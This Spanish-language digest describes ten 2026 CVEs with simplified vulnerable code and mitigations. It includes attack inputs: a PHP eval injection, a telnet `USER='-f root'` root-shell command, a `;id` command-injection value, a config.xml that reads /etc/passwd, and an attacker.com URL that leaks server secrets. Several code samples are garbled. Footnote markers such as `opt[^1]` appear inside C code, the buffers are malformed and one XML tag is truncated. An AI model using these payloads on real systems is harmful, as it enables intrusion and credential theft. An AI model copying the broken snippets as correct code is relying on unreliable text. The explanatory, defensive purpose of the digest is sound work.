# 10 vulnerabilidades recientes con PoC y documentación técnica

Este documento reúne diez vulnerabilidades recientes (2026, muchas de ellas de las últimas semanas) que cuentan con prueba de concepto (PoC) pública o código de laboratorio, explicando el contexto, raíz técnica, fragmentos de código simplificados y medidas de mitigación.

> Aviso: el código mostrado es **didáctico** y no es copia literal de los PoC públicos. Está reducido para entender el patrón de vulnerabilidad, no para atacar sistemas.

***

## 1. CVE‑2026‑44262 – RCE en dedoc/scramble (Laravel)

### Resumen

CVE‑2026‑44262 es una vulnerabilidad de ejecución remota de código (RCE) en Scramble, un generador de documentación OpenAPI para Laravel. Afecta versiones de `dedoc/scramble` desde la 0.13.2 hasta antes de la 0.13.22, cuando los endpoints de documentación son accesibles públicamente y las reglas de validación referencian input controlado por el usuario. El problema es una inyección de código (CWE‑94) porque durante la generación de la documentación se evalúan expresiones que pueden incorporar datos de la petición.[^1][^2][^3][^4]

Hay PoCs públicos en GitHub que automatizan el envío de peticiones HTTP maliciosas contra rutas de documentación de Scramble (por ejemplo, `/docs/api`).[^5][^2][^6]

### Raíz técnica

Scramble inspecciona controladores y reglas de validación para generar documentación y, en el proceso, evalúa expresiones relacionadas con dichas reglas. Si estas reglas contienen referencias a datos de la request (como parámetros o contenido del body), la evaluación puede tratar esos datos como código PHP en lugar de datos.[^2][^3]

El flujo conceptual es:

1. El usuario define validaciones en Laravel (por ejemplo, reglas complejas tipo expresión).
2. Scramble analiza esas reglas para documentar qué valida cada endpoint.
3. Para algunas reglas, Scramble construye una expresión PHP y la ejecuta con algo equivalente a `eval()` en el contexto de la aplicación.
4. Si parte de esa expresión proviene de input de usuario, se abre la puerta a que se ejecute código arbitrario.

### Código vulnerable (PHP simplificado)

```php
// Ejemplo didáctico aproximado

// Request llega a un endpoint documentado por Scramble
$ruleInput = $request->input('rule'); // Controlado por el atacante

// Scramble construye un contexto de variables para evaluar reglas
$variables = [
    'code' => $ruleInput,
];

// Extrae variables, creando $code en el scope
extract($variables);

// PELIGRO: evalua directamente una expresión basada en input
$result = eval("return $code;");
```

En un escenario real, el atacante podría mandar algo como:

```http
GET /docs/api?rule=phpinfo();
```

y lograr que `phpinfo()` se ejecute en el contexto del proceso PHP que corre la aplicación, con permisos equivalentes al de Laravel (lectura de archivos, acceso a DB, etc.).[^3]

### Impacto

- Ejecución de código PHP arbitrario en el contexto de la aplicación Laravel.[^3]
- Acceso a archivos, base de datos y red con los permisos del proceso del servidor.[^3]
- Compromiso total de la aplicación si las rutas de documentación están expuestas públicamente.[^2]

### Mitigación

- Actualizar `dedoc/scramble` a la versión 0.13.22 o superior.[^2][^3]
- Proteger o deshabilitar endpoints de documentación (`/docs/api`, `/docs/api.json`) en producción.[^1][^3]
- Evitar usar datos controlados por el usuario dentro de expresiones de reglas complejas que Scramble pueda evaluar.[^1]

***

## 2. CVE‑2026‑42945 – NGINX “Rift” – heap buffer overflow en `ngx_http_rewrite_module`

### Resumen

CVE‑2026‑42945 (también llamada “NGINX Rift”) es un overflow de buffer en heap en el módulo `ngx_http_rewrite_module` de NGINX, con CVSS 9.2. El bug existe desde hace unos 18 años y afecta NGINX Open Source desde la versión 0.6.27 hasta la 1.30.0 y NGINX Plus R32–R36, así como productos relacionados como el Ingress Controller.[^7][^8][^9]

La vulnerabilidad se activa con una combinación específica de directivas `rewrite` y `set` usando capturas PCRE sin nombre (`$1`, `$2`) y un `?` en el reemplazo, y permite a un atacante remoto no autenticado provocar RCE o al menos DoS.[^9][^10][^7]

Hay explots y PoCs públicos en varios repositorios de GitHub que muestran cómo explotar el overflow para ejecutar código.[^8][^10][^11][^12]

### Raíz técnica

NGINX procesa reglas `rewrite` en dos fases:

1. **Fase de cálculo de longitud**: calcula cuánto espacio necesita para construir la nueva URI.
2. **Fase de copia/escape**: copia y escapa la URI real en un buffer en heap.

En esta vulnerabilidad, el flag `is_args` (que indica si hay `?` y por tanto parámetros) se maneja de forma inconsistente entre ambas fases. En la fase de longitud se cuenta como si `is_args=0` (sin escape de parámetros), pero en la fase de copia se trata como `is_args=1` (aplicando `ngx_escape_uri`), que puede expandir caracteres como `+` y `%`, escribiendo más bytes de los reservados en heap.[^8][^9]

### Configuración vulnerable (NGINX simplificada)

```nginx
server {
    listen 80;

    # 1) rewrite con ? en el reemplazo (activa is_args)
    rewrite ^/old/(.*)$ /new/$1?foo=bar last;

    # 2) uso de captura sin nombre en set
    set $q $1;

    # 3) otra rewrite que reutiliza la captura
    rewrite ^/other/(.*)$ /final/$q last;
}
```

Con una URI especialmente construida, por ejemplo con cientos de caracteres escapables (`+`, `%xx`), el tamaño calculado del buffer se queda corto y el `ngx_escape_uri()` en la fase de copia sobreescribe memoria adyacente con datos controlados por el atacante.[^10][^8]

Los PoC reales usan peticiones como:

```http
GET /old/AAAA...AAAA HTTP/1.1
Host: vulnerable.nginx
```

con patrones para ajustar el heap (“heap feng shui”) y corromper un puntero `cleanup` de un `ngx_pool_t`, redirigiendo la ejecución a una cadena que llama a `system()`.[^11]

### Impacto

- RCE no autenticado como usuario del proceso NGINX en sistemas con configuraciones afectadas.[^7][^8]
- Denegación de servicio (crash de workers) cuando ASLR dificulta el RCE.[^8]
- Millones de instancias NGINX expuestas en Internet potencialmente vulnerables, especialmente configuraciones comunes con WordPress.[^9]

### Mitigación

- Actualizar NGINX a 1.30.1 o 1.31.0 (o versión Plus corregida).[^7][^9]
- Sustituir capturas sin nombre (`$1`, `$2`) por capturas con nombre en las directivas `rewrite` afectadas.[^7]
- Revisar configuraciones de `rewrite`/`set` y evitar patrones que coincidan con el gatillo descrito.

***

## 3. CVE‑2026‑24061 – Bypass de autenticación en GNU inetutils `telnetd`

### Resumen

CVE‑2026‑24061 es una vulnerabilidad crítica (CVSS 9.8) en `telnetd` de GNU inetutils (1.9.3–2.7) que permite a un atacante remoto no autenticado obtener un shell de root saltándose completamente la autenticación. La vulnerabilidad explota la opción Telnet NEW_ENVIRON para inyectar la variable de entorno `USER` con el valor `-f root`, lo que hace que `/bin/login` crea que el usuario ya está autenticado.[^13][^14][^15]

Existen múltiples PoCs y labs en GitHub (Go, Docker, scripts) para explotar y reproducir este fallo.[^14][^16][^17][^13]

### Raíz técnica

El demonio `telnetd` recibe variables NEW_ENVIRON del cliente y las convierte en variables de entorno del proceso antes de invocar `/bin/login`.

- `telnetd` no valida ni filtra correctamente el valor de la variable `USER`.
- `/bin/login` interpreta argumentos tipo `-f user` como “login sin pedir contraseña para `user`”.
- Si `USER` contiene `-f root`, `login` se ejecuta como si el programa hubiera sido invocado con `login -f root`.

### Código vulnerable (C simplificado)

```c
void handle_new_environ(const char *name, const char *value) {
    if (strcmp(name, "USER") == 0) {
        // Sin validación ni sanitización
        setenv("USER", value, 1);
    }
}

void spawn_login() {
    char *user = getenv("USER");

    // PELIGRO: si user == "-f root" equivale a login -f root
    execl("/bin/login", "login", user, (char *)NULL);
}
```

Un PoC típico negocia la opción NEW_ENVIRON e inyecta `USER=-f root`:[^15][^14]

```bash
env USER='-f root' telnet -a <ip> <port>
```

O desde un script que habla directamente el protocolo Telnet, enviando las secuencias `IAC SB NEW_ENVIRON` con `USER=-f root`.[^13][^14]

### Impacto

- Shell interactivo de root sin necesidad de contraseña ni credenciales válidas.[^14][^15]
- Compromiso total del sistema donde corre `telnetd` vulnerable.

### Mitigación

- Actualizar GNU inetutils a una versión corregida (posterior a 2.7).[^15]
- Deshabilitar `telnetd` en favor de SSH siempre que sea posible.[^15]
- Aplicar reglas de firewall o segmentación de red para impedir accesos externos a puertos telnet.

***

## 4. CVE‑2026‑41089 – RCE en Windows Netlogon vía CLDAP

### Resumen

CVE‑2026‑41089 es una vulnerabilidad crítica de desbordamiento de buffer en pila en el servicio Netlogon de Windows, específicamente en la ruta del DC‑locator servida por CLDAP (Connectionless LDAP). Tiene CVSS 9.8 y permite RCE pre‑autenticación contra controladores de dominio.[^18][^19][^20][^21]

Un solo paquete CLDAP especialmente construido enviado a UDP/389 en un DC puede causar overflow dentro de LSASS (que aloja Netlogon), lo que permite ejecución de código con privilegios SYSTEM o al menos DoS. Existen repositorios públicos que ofrecen PoCs experimentales que provocan el crash y demuestran el flujo vulnerable.[^22][^23][^19][^20][^18]

### Raíz técnica

La vulnerabilidad reside en cómo Netlogon construye la respuesta de ping de dominio (DC locator):

- El atacante envía una petición CLDAP con ciertos atributos (`DnsDomain`, `User`, `NtVer`).
- Para un valor concreto de `NtVer`, el código toma la ruta antigua `BuildSamLogonResponse` en lugar de la versión endurecida `BuildSamLogonResponseEx`.[^19]
- `BuildSamLogonResponse` llama a funciones como `NetpLogonPutUnicodeString` que copian cadenas Unicode en buffers de longitud fija en la pila sin validar adecuadamente la longitud.[^19]

### Código vulnerable (C simplificado)

```c
void NetpLogonPutUnicodeString(const wchar_t *src) {
    wchar_t buf;  // buffer en pila (~528 bytes)
    size_t len = wcslen(src); // longitud sin límite

    // PELIGRO: copia sin comprobar que quepa en buf
    memcpy(buf, src, len * sizeof(wchar_t));
}
```

Un PoC conceptualmente construye una petición CLDAP con:

- `User` con más de ~130 caracteres Unicode.
- `NtVer` con bits que fuerzan la ruta antigua.

Al procesar la respuesta, la copia en el buffer fijo provoca overflow de pila, sobrescribiendo datos como direcciones de retorno.[^18][^19]

### Impacto

- RCE pre‑autenticación como SYSTEM en controladores de dominio, con control total sobre el bosque de Active Directory.[^18][^19]
- Denegación de servicio si solo se logra crash sin explotación estable.[^20]

### Mitigación

- Aplicar los parches de seguridad de Microsoft que corrigen CVE‑2026‑41089.[^20][^18]
- Limitar el acceso a UDP/389 desde redes no confiables (segmentación, firewalls).[^19]
- Supervisar logs y telemetry de LSASS para detectar crashes anómalos asociados a Netlogon.

***

## 5. CVE‑2026‑10520 – Ivanti Sentry – inyección de comandos OS

### Resumen

CVE‑2026‑10520 es una vulnerabilidad de inyección de comandos del sistema operativo en Ivanti Sentry, con CVSS 10.0. Afecta a Ivanti Sentry en configuraciones específicas y permite a atacantes remotos no autenticados ejecutar comandos arbitrarios en el sistema operativo subyacente.[^24][^25]

Investigadores de watchTowr publicaron un análisis técnico y un PoC el 10 de junio de 2026, mostrando cómo lograr RCE explotando un endpoint accesible sin autenticación.[^25][^24]

### Raíz técnica

El fallo se clasifica como OS Command Injection (CWE‑78). Un endpoint realiza una operación legítima del sistema (como `ping`) recibiendo parámetros desde la petición HTTP, pero los concatena directamente en una invocación de shell.[^25]

### Código vulnerable (pseudo‑Python)

```python
from flask import request
import os

@app.route("/diagnostic/ping")
def ping():
    target = request.args.get("target", "127.0.0.1")

    # PELIGRO: concatenación directa en comando de shell
    os.system("/bin/ping -c 1 " + target)

    return "OK"
```

Un atacante puede mandar:

```http
GET /diagnostic/ping?target=127.0.0.1;id
```

y el proceso ejecutará `/bin/ping -c 1 127.0.0.1;id`, logrando ejecución de comandos arbitrarios.[^25]

### Impacto

- RCE no autenticada en el appliance Ivanti Sentry.[^24][^25]
- Posible pivote a redes internas protegidas, robo de credenciales y datos.

### Mitigación

- Aplicar los parches y versiones corregidas recomendadas por Ivanti para CVE‑2026‑10520.[^24][^25]
- Colocar Sentry detrás de firewalls que limiten quién puede acceder a los endpoints administrativos.[^25]
- Validar input y evitar invocar shells con concatenación de strings; usar APIs específicas del sistema o `execve` con arrays.

***

## 6. CVE‑2026‑53435 – Jenkins – deserialización insegura vía `config.xml`

### Resumen

CVE‑2026‑53435 es una vulnerabilidad crítica de deserialización de datos no confiables (CWE‑502) en Jenkins. Afecta versiones Jenkins 2.567 y anteriores, y Jenkins LTS 2.555.2 y anteriores, permitiendo a atacantes con ciertos permisos forzar la deserialización de tipos arbitrarios definidos en Jenkins core o plugins a través de envíos manipulados de `config.xml`.[^26][^27][^28]

Un exploit exitoso puede permitir suplantación de usuarios, lectura de archivos arbitrarios en el controlador y ejecución de código a través de la Script Console. Informes indican que la vulnerabilidad ya ha sido explotada en honeypots y entornos reales.[^29][^28][^26]

### Raíz técnica

Jenkins utiliza XML (`config.xml`) para almacenar configuraciones de jobs, vistas y otras entidades. Algunas rutas permiten subir o modificar estos XML a través de peticiones HTTP autenticadas.

- La vulnerabilidad permite que un atacante envíe un `config.xml` manipulando tipos de clases en el XML.
- Durante el procesamiento, Jenkins deserializa estas clases sin restringir suficientemente qué tipos son permitidos.[^27][^26]
- Ciertas clases del core o plugins forman cadenas de gadgets que, al deserializar, ejecutan lógica peligrosa (leer archivos, ejecutar scripts, procesar HTTP).

### Ejemplo de `config.xml` malicioso (simplificado)

```xml
<project>
  <actions/>
  <description>Malicious job</description>
  <properties/>
  <builders>
    <hudson.tasks.Shell>
      mmand>cat /etc/passwd</command>
    </hudson.tasks.Shell>
  </builders>
</project>
```

En combinación con la lógica de deserialización vulnerable, un PoC puede hacer que Jenkins acepte este `config.xml` y ejecute el comando como parte de la configuración/ejecución del job, o usar gadgets más complejos para lograr RCE indirecta.[^28][^29]

### Impacto

- Ejecución de código arbitrario en el controlador Jenkins mediante Script Console y gadgets de deserialización.[^29][^28]
- Lectura de archivos sensibles (`config.xml`, credenciales, etc.).[^28]
- Suplantación de usuarios y emisión de peticiones HTTP en su nombre.[^30][^26]

### Mitigación

- Actualizar Jenkins a la versión 2.568 o posterior; o Jenkins LTS a 2.555.3 o posterior.[^27][^28]
- Restringir el acceso a endpoints como `/job/*/config.xml`, deshabilitar acceso anónimo y usar credenciales fuertes.[^29]
- Revisar permisos de usuarios, evitar que cuentas con privilegios bajos puedan subir `config.xml` personalizados.

***

## 7. CVE‑2026‑50751 – Check Point Remote Access VPN – bypass de autenticación (IKEv1)

### Resumen

CVE‑2026‑50751 es una vulnerabilidad crítica de bypass de autenticación en Check Point Remote Access VPN y Mobile Access que afecta despliegues configurados con el protocolo IKEv1 para acceso remoto. Debido a una debilidad en el flujo lógico de validación de certificados, un atacante remoto no autenticado puede establecer un túnel VPN sin una contraseña válida.[^31][^32][^33][^34]

El fallo se ha explotado en ataques dirigidos, y Check Point lanzó parches y recomendaciones específicas a inicios de junio de 2026.[^32][^34][^31]

### Raíz técnica

La vulnerabilidad surge en la lógica de autenticación del handshake IKEv1:

- El cliente envía un certificado y otros datos de autenticación.
- Debido a una condición de flujo incorrecta, ciertos flags de autenticación pueden marcarse como válidos incluso cuando el certificado o la prueba de posesión no se han verificado correctamente.[^31][^32]
- Bajo configuraciones concretas (aceptar clientes legacy, IKEv1 habilitado, no exigir certificado de máquina), el gateway establece el túnel VPN sin validar realmente la identidad.

Investigadores han publicado clientes IKEv1 de PoC que manipulan el Vendor ID y otros campos del paquete IKE para aprovechar este fallo.[^35][^31]

### Esquema de código vulnerable (pseudo‑C)

```c
struct auth_ctx {
    bool cert_ok;
    bool sig_ok;
    bool legacy_ok;
};

bool finalize_auth(struct auth_ctx *ctx) {
    // Lógica incorrecta (ejemplo didáctico)
    if (ctx->cert_ok || ctx->legacy_ok) {
        return true;  // PELIGRO: cert_ok puede ser false pero legacy_ok true por un flujo alternativo
    }
    return false;
}
```

Un PoC manipula valores de Vendor ID y modos de autenticación para hacer que `legacy_ok` se marque como verdadero sin prueba adecuada, forzando el éxito de `finalize_auth()`.[^32][^31]

### Impacto

- Establecimiento de túnel VPN hacia la red interna de la organización sin credenciales válidas.[^33][^34][^31]
- Acceso no autorizado a servicios internos, posible movimiento lateral y exfiltración de datos.

### Mitigación

- Aplicar los hotfix/actualizaciones de Check Point para CVE‑2026‑50751.[^34][^32]
- Desactivar soporte a clientes legacy e IKEv1 para acceso remoto, forzando IKEv2.[^34][^32]
- Hacer obligatorio el uso de certificado de máquina para clientes VPN.[^32]

***

## 8. Vulnerabilidad en plugin ARMember Premium para WordPress (CVE‑2026‑5076)

### Resumen

CVE‑2026‑5076 afecta al plugin ARMember Premium para WordPress y se relaciona con un mecanismo inseguro de reseteo de contraseña. La vulnerabilidad radica en que el plugin almacena una copia en texto claro de la clave de reseteo de contraseña en la tabla `wp_usermeta`, además de la clave hasheada que WordPress mantiene en `wp_users.user_activation_key`.[^36]

En combinación con vulnerabilidades de SQL injection (como CVE‑2026‑5073 y CVE‑2026‑5074), un atacante puede extraer la clave de reseteo y tomar control de cualquier cuenta, incluyendo administradores.[^36]

### Raíz técnica

WordPress ya implementa un sistema seguro de reseteo de contraseña, pero el plugin introduce un flujo paralelo:

1. El usuario solicita reset de contraseña.
2. WordPress genera una clave y la guarda hasheada.
3. ARMember guarda una copia **en texto claro** de esa clave en un meta campo `arm_reset_password_key` en `wp_usermeta`.[^36]
4. El plugin expone un endpoint de reset propio (`armrp`) que acepta la clave en texto claro y permite cambiar la contraseña.

Con acceso a la base de datos (obtenido vía SQL injection u otra vía), el atacante puede leer `arm_reset_password_key` para un usuario objetivo y usarla para cambiarle la contraseña.[^36]

### Código vulnerable (PHP simplificado)

```php
// Al solicitar reset
$key = wp_generate_password(20, false);

// WordPress guarda hash internamente
wp_update_user_activation_key($user_id, $key);

// ARMember guarda la clave en texto claro
update_user_meta($user_id, 'arm_reset_password_key', $key);  // PELIGRO

// Endpoint de reset personalizado
if ($_GET['action'] === 'armrp') {
    $user_id = $_GET['user_id'];
    $key     = $_GET['key'];

    $stored = get_user_meta($user_id, 'arm_reset_password_key', true);

    if ($stored === $key) {
        // Cambiar contraseña sin más comprobaciones
        wp_set_password($_POST['new_password'], $user_id);
    }
}
```

### Impacto

- Toma de cuentas de usuario y administrador combinando SQL injection y este flujo de reset inseguro.[^36]
- Compromiso completo del sitio WordPress.

### Mitigación

- Actualizar ARMember Premium a una versión que elimine el almacenamiento de claves en texto claro.[^36]
- Borrar meta campos `arm_reset_password_key` existentes.
- Evitar exponer endpoints personalizados de reseteo que dupliquen la lógica de WordPress sin las mismas precauciones.

***

## 9. CVE‑2026‑32625 – LibreChat MCP env‑var exfiltration

### Resumen

CVE‑2026‑32625 afecta a LibreChat, un clon de ChatGPT que integra múltiples proveedores de IA y servidores MCP (Model Context Protocol). En versiones hasta la 0.8.3, la integración MCP resolvía placeholders `${VAR}` contra variables de entorno del servidor durante la validación de URLs de MCP, lo que permitía exfiltrar secretos críticos mediante una URL controlada por el atacante.[^37]

Un usuario autenticado sin privilegios de administrador podía configurar un servidor MCP malicioso y hacer que el servidor LibreChat se conectara a una URL que incluía secretos en la query string.[^37]

### Raíz técnica

Cuando se configuraba un servidor MCP, la URL permitía placeholders como `${CREDS_KEY}` o `${MONGO_URI}`; la validación con Zod resolvía estos placeholders contra `process.env` y luego realizaba una petición a esa URL.[^37]

### Código vulnerable (Node.js simplificado)

```js
// Configuración MCP controlada por el usuario
const serverUrl = formInput.url; // p.ej. "https://attacker.com/${JWT_SECRET}?db=${MONGO_URI}"

// Validación con Zod (simplificada)
const resolvedUrl = serverUrl.replace(/\$\{([^}]+)\}/g, (_, name) => {
  return process.env[name] || "";
});

// PELIGRO: se hace request a URL con secretos en claro
await fetch(resolvedUrl);
```

El atacante configura un MCP server con una URL como:

```text
https://attacker.com/${CREDS_KEY}?iv=${CREDS_IV}&jwt=${JWT_SECRET}&db=${MONGO_URI}
```

Cuando LibreChat valida esta configuración, sustituye los placeholders por valores reales de `process.env` y realiza una petición HTTP a `attacker.com`, filtrando todas las credenciales.[^37]

### Impacto

- Exfiltración de claves de cifrado (`CREDS_KEY`, `CREDS_IV`), secretos JWT (`JWT_SECRET`) y credenciales de base de datos (`MONGO_URI`).[^37]
- Compromiso completo de datos y autenticación de la instalación de LibreChat.

### Mitigación

- Actualizar LibreChat al menos a la versión 0.8.4‑rc1, donde se corrige este comportamiento.[^37]
- Evitar interpolar variables de entorno en datos controlados por usuarios.
- Implementar validaciones de URLs que no resuelvan placeholders sensibles en rutas controladas por usuarios.

***

## 10. CVE‑2026‑44815 – Overflow en cliente DHCP de Windows

### Resumen

CVE‑2026‑44815 es una vulnerabilidad crítica (CVSS 9.8) de desbordamiento de buffer en la pila en el cliente DHCP de Windows. Permite a un atacante en la misma red (o que controle un servidor DHCP malicioso) ejecutar código con privilegios elevados enviando respuestas DHCP especialmente formadas.[^38]

La vulnerabilidad fue publicada con alta severidad y parches de Microsoft disponibles en junio de 2026.[^38]

### Raíz técnica

El bug se encuentra en el procesamiento de opciones DHCP en el cliente:

- El cliente recibe un paquete DHCP con opciones de longitud declarada.
- Una de las opciones (por ejemplo, opción 15 – domain‑name) se copia a un buffer en la pila usando la longitud declarada por el paquete, sin validación adecuada.[^38]

### Código vulnerable (C simplificado)

```c
void handle_dhcp_option(const uint8_t *opt) {
    uint8_t type = opt;
    uint8_t len  = opt[^1];

    char buf; // buffer fijo en pila

    if (type == 15) { // domain-name
        // PELIGRO: no se valida que len <= sizeof(buf)
        memcpy(buf, &opt[^2], len);
        buf[len] = '\0';

        process_domain_name(buf);
    }
}
```

Un servidor DHCP malicioso puede enviar una opción 15 con `len` muy grande y datos cuidadosamente construidos, provocando overflow de pila y potencial RCE en el contexto del cliente DHCP.[^38]

### Impacto

- RCE en clientes Windows que usan el cliente DHCP estándar, desde la red local o desde redes controladas por el atacante.[^38]
- Posible elevación de privilegios si el cliente corre con privilegios altos.

### Mitigación

- Aplicar los parches de Windows que corrigen CVE‑2026‑44815.[^38]
- Usar segmentación de red para minimizar la posibilidad de servidores DHCP no confiables.
- Monitorizar y bloquear servidores DHCP no autorizados (DHCP snooping en switches).

---

## References

1. [CVE-2026-44262 - Exploits & Severity - Feedly](https://feedly.com/cve/CVE-2026-44262) - ### Impact A remote code execution (RCE) vulnerability affects versions `0.13.2` through `0.13.21`. ...

2. [CVE-2026-44262 - Scramble: Remote code execution ... - CVEFeed.io](https://cvefeed.io/vuln/detail/CVE-2026-44262) - Scramble generates API documentation for Laravel project. From 0.13.2 to before 0.13.22, when docume...

3. [CVE-2026-44262: Scramble Laravel RCE Vulnerability - SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-44262/) - CVE-2026-44262 is a remote code execution vulnerability in Scramble for Laravel. Learn about its imp...

4. [CVE-2026-44262: CWE-94: Improper Control of Generation of Code ...](https://radar.offseq.com/threat/cve-2026-44262-cwe-94-improper-control-of-generati-76db591c) - Detailed information about CVE-2026-44262: CWE-94: Improper Control of Generation of Code ('Code Inj...

5. [Scramble Laravel - Remote Code Execution (CVE-2026-44262)](https://pentest-tools.com/vulnerabilities-exploits/scramble-laravel-remote-code-execution_29361) - The risk exists that a remote unauthenticated attacker can fully compromise the server to steal conf...

6. [joshuavanderpoll/CVE-2026-44262: Unauthenticated RCE in dedoc ...](https://github.com/joshuavanderpoll/CVE-2026-44262) - Unauthenticated RCE in dedoc/scramble — PoC, Nmap NSE & Nuclei template. - joshuavanderpoll/CVE-2026...

7. [Critical 18-Year-Old NGINX RCE (CVE-2026-42945) and GitHub ...](https://securityonline.info/nginx-rce-vulnerability-cve-2026-42945-poc-disclosure/) - Public PoC for NGINX CVE-2026-42945. An 18-year-old RCE flaw in the rewrite module enables server ta...

8. [Cyber Threat Brief — June 9 2026 - AJ King](https://ajking.io/threat-briefs/threat-brief-2026-06-09/) - Chrome V8 zero-day patched today, NGINX 18-year-old heap overflow under active exploitation with pub...

9. [Cyber Threat Brief — May 29 2026 - AJ King](https://ajking.io/threat-briefs/threat-brief-2026-05-29/) - NGINX Rift (CVE-2026-42945) CVSS 9.2 heap overflow exploited ITW since May 16 — 5.7M exposed instanc...

10. [0xBlackash/CVE-2026-42945 - NGINX Rift - GitHub](https://github.com/0xBlackash/CVE-2026-42945) - CVE-2026-42945. Contribute to 0xBlackash/CVE-2026-42945 development by creating an account on GitHub...

11. [jelasin/CVE-2026-42945 - GitHub](https://github.com/jelasin/CVE-2026-42945) - Contribute to jelasin/CVE-2026-42945 development by creating an account on GitHub.

12. [cipherspy/CVE-2026-42945-POC - GitHub](https://github.com/cipherspy/CVE-2026-42945-POC) - exploit for CVE-2026-42945. Contribute to cipherspy/CVE-2026-42945-POC development by creating an ac...

13. [JayGLXR/CVE-2026-24061-POC - GitHub](https://github.com/JayGLXR/CVE-2026-24061-POC) - A vulnerability in GNU inetutils-telnetd allows remote attackers to bypass authentication via the NE...

14. [Chocapikk/CVE-2026-24061 - GitHub](https://github.com/Chocapikk/CVE-2026-24061) - Contribute to Chocapikk/CVE-2026-24061 development by creating an account on GitHub.

15. [CVE-2026-24061｜Telnetd存在远程认证绕过漏洞（POC） - 腾讯云](https://cloud.tencent.com/developer/article/2633211) - Telnet协议曝高危漏洞CVE-2026-24061，影响GNU InetUtils 1.9.3至2.7版本。攻击者可利用环境变量注入漏洞绕过认证，通过构造USER=-f root参数直接获取roo...

16. [cve-2026-24061 · GitHub Topics](https://github.com/topics/cve-2026-24061) - Proof of Concept: CVE-2026-24061 is a critical authentication bypass vulnerability in GNU inetutils-...

17. [inetutils-telnetd auth bypass lab, CVE-2026-24061 - GitHub](https://github.com/leonjza/inetutils-telnetd-auth-bypass) - A small docker lab to play with cve-2026-24061, the inetutils-telnetd authentication bypass. - leonj...

18. [CVE-2026-41089: CRITICAL (CVSS 9.8) - EchelonGraph](https://echelongraph.io/pulse/CVE-2026-41089) - EG 9.8 · CVSS 9.8 CRITICAL · EPSS top 98.6% · Stack-based buffer overflow in Windows Netlogon allows...

19. [Windows Netlogon 0-Click RCE CVE-2026-41089 — Active ...](https://intel.threadlinqs.com/threat/TL-2026-0642) - CVE-2026-41089 is a critical, pre-authentication (0-click) stack-based buffer overflow in the Window...

20. [CVE-2026-41089 - Exploits & Severity - Feedly](https://feedly.com/cve/CVE-2026-41089) - Stack-based buffer overflow in Windows Netlogon allows an unauthorized attacker to execute code over...

21. [Netlogon RCE CVE-2026-41089 Flaw | Orca Security](https://orca.security/resources/blog/netlogon-rce-cve-2026-41089/) - Critical Netlogon RCE CVE-2026-41089 puts Windows Server domain controllers at risk. Use Orca Securi...

22. [CVE-2026-41089 是Windows Netlogon 服务中一个关键的远程代码 ...](https://github.com/hnytgl/CVE-2026-41089) - CVE-2026-41089 — Windows Netlogon CLDAP Remote Code Execution. 本仓库目前没有可复现的远程代码执行成功证据，默认ROP 地址包含占位值， ...

23. [0xBlackash/CVE-2026-41089 - GitHub](https://github.com/0xBlackash/CVE-2026-41089) - ⚠️ A critical Windows Netlogon vulnerability allowing unauthenticated remote code execution on domai...

24. [Multiple critical vulnerabilities affecting Ivanti Sentry - Rapid7](https://www.rapid7.com/blog/post/etr-cve-2026-10520-cve-2026-10523-multiple-critical-vulnerabilities-affecting-ivanti-sentry/) - On June 10, 2026, watchTowr published a technical analysis of CVE-2026-10520 that includes a proof-o...

25. [Ivanti June 2026 — Vulnerability Advisory Deep Dive](https://thecyberthrone.in/2026/06/11/ivanti-june-2026-vulnerability-advisory-deep-dive/) - CVE-2026-10520 | Ivanti Sentry | CVSS 10.0 — OS Command Injection Vulnerability class: CWE-78 — OS C...

26. [Jenkins - CVE-2026-53435 | Portail du CERT Santé](https://cyberveille.esante.gouv.fr/alertes/jenkins-cve-2026-53435-2026-06-11)

27. [CVE-2026-53435 Detail - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-53435) - 2 and earlier, it is possible for attackers to have Jenkins deserialize arbitrary types defined in J...

28. [CVE-2026-53435 - Jenkins - dbugs - Positive Technologies](https://dbugs.ptsecurity.com/vulnerability/PT-2026-48420) - Details on CVE-2026-53435: Remote Code Execution in Jenkins Jenkins. Includes CVSS score, affected v...

29. [Jenkins RCE Vulnerability Under Active Exploitation in the ...](https://cyberpress.org/jenkins-rce-vulnerability/) - A critical deserialization vulnerability in Jenkins is now being actively exploited by threat actors...

30. [Critical Jenkins Security Advisory 2026: Patch Multiple Flaws](https://securityonline.info/jenkins-security-advisory-2026-critical-cves/) - A critical Jenkins security advisory 2026 warns of deserialization and XSS flaws like CVE-2026-53435...

31. [Researchers release details, PoC for exploited Check Point VPN ...](https://www.helpnetsecurity.com/2026/06/12/cve-2026-50751-poc-exploit/) - WatchTowr researchers have disclosed a technical analysis and PoC exploit for an actively exploited ...

32. [Check Point - CVE-2026-50751](https://cyberveille.esante.gouv.fr/alertes/check-point-cve-2026-50751-2026-06-09)

33. [CVE-2026-50751: Bypass de Autenticação na VPN da ...](https://socprime.com/pt/blog/cve-2026-50751-vulnerabilidade-de-autenticacao-do-check-point-vpn-explorada-em-ataques-direcionados/) - A Check Point alertou que a CVE-2026-50751 foi explorada em ataques direcionados contra implantações...

34. [Critical Vulnerability in Check Point VPN](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-070/) - Attackers are actively exploiting a critical vulnerability in Check Point VPN to bypass authenticati...

35. [CVE-2026-50751 - Authentication Bypass in Check Point VPN (IKEv1)](https://github.com/0xBlackash/CVE-2026-50751) - CVE-2026-50751. Contribute to 0xBlackash/CVE-2026-50751 development by creating an account on GitHub...

36. [CVE-2026-5076 - Exploits & Severity - Feedly](https://feedly.com/cve/CVE-2026-5076) - The ARMember Premium plugin for WordPress is vulnerable to an insecure password reset mechanism in a...

37. [CVE-2026-32625 - Exploits & Severity - Feedly](https://feedly.com/cve/CVE-2026-32625) - LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. In versions up to and in...

38. [CVE-2026-44815 (CRITICAL) - Vulnerability Analysis](https://cve.tools/v/CVE-2026-44815) - CVE-2026-44815: CVSS 9.8 CRITICAL · EPSS 0.4% · Patch available · Operating Systems. Stack-based buf...

